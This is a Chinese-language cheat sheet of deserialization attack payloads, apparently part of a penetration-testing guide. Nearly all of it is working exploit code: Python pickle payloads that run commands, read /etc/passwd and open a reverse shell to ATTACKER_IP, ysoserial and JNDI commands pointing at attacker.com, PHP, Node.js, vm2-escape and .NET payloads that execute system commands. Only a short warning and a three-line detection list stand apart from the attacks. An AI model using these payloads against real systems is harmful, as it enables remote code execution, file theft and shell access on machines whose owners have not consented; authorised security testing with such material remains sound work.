# 反序列化攻击载荷库

> 用于 A2 注入测试的反序列化专项扩展。

---

## Python (Pickle)

### 基本 RCE

```python
import pickle, os

# Payload: 执行 whoami
class Exploit:
    def __reduce__(self):
        return (os.system, ('whoami',))

payload = pickle.dumps(Exploit())
# b'\x80\x04\x95\x1e\x00\x00\x00\x00\x00\x00\x00\x8c\x02nt\x8c\x06system\x93\x8c\x06whoami\x85R.'
```

### 文件读取

```python
class FileReader:
    def __reduce__(self):
        return (open, ('/etc/passwd', 'r'))

payload = pickle.dumps(FileReader())
```

### 反向 Shell

```python
import socket, subprocess

class ReverseShell:
    def __reduce__(self):
        return (subprocess.Popen, (
            ('/bin/bash', '-c', 
             'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'),
        ))
```

---

## Java 反序列化

### 常见漏洞库

| 库 | Gadget Chain |
|----|-------------|
| Commons Collections | `InvokerTransformer` + `ChainedTransformer` |
| Spring | `MethodInvokeTypeProvider` |
| Hibernate | `BasicPropertyAccessor` |
| Groovy | `MethodClosure` |
| Fastjson | `@type` 自动类型解析 |

### 探测载荷

```java
// URLDNS gadget（无危害探针，仅触发 DNS 请求）
// 检查反序列化是否可执行——如果在你的 DNS 服务器上收到了查询，说明存在漏洞
```

### 生成工具

```bash
# ysoserial
java -jar ysoserial.jar CommonsCollections1 'whoami' | base64

# JNDI 注入
java -jar ysoserial.jar JNDI 'ldap://attacker.com/exp' | base64
```

---

## PHP 反序列化

### 魔法方法链

```php
// __wakeup() → __destruct() → __toString() → __call()
class Exploit {
    public $cmd = "whoami";
    function __destruct() {
        system($this->cmd);
    }
}
echo serialize(new Exploit());
// O:7:"Exploit":1:{s:3:"cmd";s:6:"whoami";}
```

### 属性篡改

```php
// 修改对象属性绕过逻辑检查
O:8:"UserInfo":2:{s:8:"username";s:5:"admin";s:7:"isAdmin";b:1;}
```

---

## Node.js 反序列化

### node-serialize

```javascript
// 检测：传入带函数签名的序列化数据
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('whoami')}"}
```

### serialize-javascript

```javascript
// 如果 unsafe: true
{"toString": {"__proto__": true}}
```

### JavaScript 沙箱逃逸

```javascript
// vm2 / isolated-vm 逃逸
this.constructor.constructor('return this.process')().mainModule.require('child_process').execSync('whoami')
```

---

## .NET 反序列化

```xml
<!-- ObjectDataProvider -->
<ObjectDataProvider MethodName="Start" 
    xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
    xmlns:sd="clr-namespace:System.Diagnostics;assembly=System">
  <ObjectDataProvider.ObjectInstance>
    <sd:Process>
      <sd:Process.StartInfo>
        <sd:ProcessStartInfo Arguments="/c whoami" FileName="cmd" />
      </sd:Process.StartInfo>
    </sd:Process>
  </ObjectDataProvider.ObjectInstance>
</ObjectDataProvider>
```

---

## 通用检测策略

1. **类型白名单**：确认反序列化是否有类型白名单
2. **格式篡改**：发送损坏的序列化数据观察错误信息
3. **版本探测**：错误信息可能暴露库版本

---

## ⚠️ 安全警告

- 反序列化 RCE 是最危险的漏洞之一
- **确认漏洞后立即停止**——不要执行实际的反向 Shell
- 优先使用 URLDNS 等无危害探针
